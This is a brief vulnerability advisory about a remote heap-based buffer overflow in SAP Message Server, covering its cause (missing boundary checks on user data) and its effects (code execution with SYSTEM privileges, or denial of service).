SAP Message Server is prone to a remote heap-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data before copying it to an insufficiently sized buffer.

Remote attackers can exploit this issue to execute arbitrary code with SYSTEM-level privileges. Successful attacks will result in a complete compromise of affected computers. Failed attacks will likely result in denial-of-service conditions that disable all functionality of the application.
